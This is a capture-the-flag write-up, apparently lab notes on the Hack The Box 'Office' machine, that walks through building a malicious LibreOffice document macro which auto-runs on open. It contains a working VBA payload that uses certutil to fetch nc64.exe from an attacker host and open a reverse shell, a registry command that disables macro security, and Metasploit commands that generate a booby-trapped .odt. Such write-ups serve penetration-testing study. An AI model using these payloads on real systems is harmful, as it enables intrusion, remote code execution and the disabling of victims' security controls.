# LAB — Macro Attacks (HTB: Office)

---

## Scenario

- **Box:** Hack The Box — *Office* (Avengers-themed)
- **Goal:** Achieve a reverse shell via a malicious Office macro embedded in a document uploaded through a resume submission portal (`resume.php`).
- **Context:** Initial access was already obtained via another web vector. This macro attack is used for **lateral movement / horizontal privilege escalation** to the user *Potts*. The same technique works as an initial access vector in other scenarios.

---

## Step 1: Identify the Target Document Format

Before crafting the payload, determine which office suite the target machine runs — this dictates the file format.

| Suite           | Format    | Extension |
| --------------- | --------- | --------- |
| Microsoft Word  | Word Doc  | `.doc` / `.docm` |
| LibreOffice     | ODF Text  | `.odt`    |

> [!TIP]
> **Black-box:** If you don't have a shell yet, use trial and error — upload `.doc` first, then try `.odt`.
> **White-box / post-compromise:** Check `C:\Program Files\` for installed software folders.

Since we already had a shell, listing `C:\Program Files\` confirmed **LibreOffice** was installed (no Microsoft Office folder present) → we need `.odt` format.

## Step 3: Create the Macro in LibreOffice Writer

1. Open **LibreOffice Writer** (document can be left blank for CTF purposes).
2. Navigate to **Tools → Macros → Edit Macros**.
3. In the macro editor, go to **Untitled.1 → Standard → Module1**.
4. Write the VBA reverse shell payload.

![](attachments/Pasted%20image%2020260909113325.png)

![](attachments/Pasted%20image%2020260909115302.png)

### VBA Payload — Reverse Shell via `certutil` + `nc64.exe`

```vb
Sub MyMacro
	Dim str as String
	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
	Shell(str)
End Sub
```

**What this does:**
1. Uses `certutil` to download `nc64.exe` from our Python HTTP server to `C:\ProgramData\`.
2. Chains (`&&`) execution of `nc64.exe` to send a reverse shell back to us.

> [!NOTE]
> - `Shell()` is VB's built-in function to execute system commands.
> - Alternatively, you can use `WScript.Shell.Run(str)` — creates a new shell process under the Writer process. **Note this down — you'll use `WScript.Shell` frequently.**
> - Use `&&` for command chaining on Windows, **not** Linux semicolons (`;`).

## Step 4: Bind the Macro to the "Open Document" Event

The macro must auto-execute when the document is opened — otherwise it just sits there.

1. Go to **Tools → Customize → Events** tab.
2. Find the **Open Document** event.
3. Assign your macro: **Standard → Module1 → MyMacro** (or `Main`).

This ensures whenever anyone opens the document, the macro fires automatically.

## Troubleshooting — First Attempt Failed

### Problem 1: Incorrect `nc64.exe` Path

After uploading, the file disappeared from the server (bot opened it), but **no shell arrived**.

**Root cause:** The macro referenced `nc64.exe` in `C:\ProgramData\` but it wasn't there yet, and the `certutil` download command had a typo (saved as `nc.exe` but tried to execute `nc64.exe`).

**Fix:** Corrected the `certutil` command to download **and** execute with consistent filenames. Re-saved and re-uploaded.

### Problem 2: Macro Security Level Blocking Execution

After fixing the path, the shell **still** failed. The macro wasn't executing at all.

**Root cause:** LibreOffice macro security on the target was set to **High (value 3)** — blocks all macro execution unconditionally.

**Fix:** Since our current user had registry write permissions, we lowered the macro security level via the registry:

```powershell
reg add "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting" /v "Value" /t REG_DWORD /d 0 /f
```

> [!IMPORTANT]
> Setting the value to `0` permits all macros to execute without prompts. This registry modification requires appropriate user privileges on the target.

---

## Step 8: Successful Reverse Shell

After lowering macro security:

1. Re-uploaded `resume.odt`.
2. Bot opened the document → macro auto-fired → `certutil` downloaded `nc64.exe` → reverse shell connected.
3. **Shell caught as user `Potts`** on the target machine.

> [!NOTE]
> The file lifecycle on the server: `.tmp` → `.dash` → deleted — indicating the bot processed and consumed it.

## Alternative: Automating with Metasploit

Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).

### Generate the Payload

```bash
msfconsole
use exploit/multi/fileformat/openoffice_document_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```

This outputs a ready-to-upload `.odt` file.

### Catch the Shell

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.21
set LPORT 4445
run
```

Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.

```
sessions -i 1
```

Confirms: Computer name, OS (Windows Server 2022), and user context.

## Key Takeaways & Lessons Learned

1. **Always identify the target office suite first** — check `C:\Program Files\` for Microsoft Office vs LibreOffice folders.
2. **LibreOffice uses the "Open Document" event** (under Tools → Customize → Events) instead of Word's `AutoOpen()` / `Document_Open()` subs.
3. **Macro security can block everything** — if macros don't fire, check/modify the registry security level (`0` = allow all, `3` = block all).
4. **`certutil` is your friend** for downloading files on Windows when other tools aren't available.
5. **Be consistent with filenames** — downloading as `nc.exe` but executing `nc64.exe` will silently fail.
6. **Manual vs Metasploit trade-off:**
   - *Manual* → better AV evasion, deeper understanding of mechanics.
   - *Metasploit* → faster during active engagements, generates cross-platform payloads automatically.
7. **Use `rlwrap`** with netcat listeners for readline support (arrow keys, history).
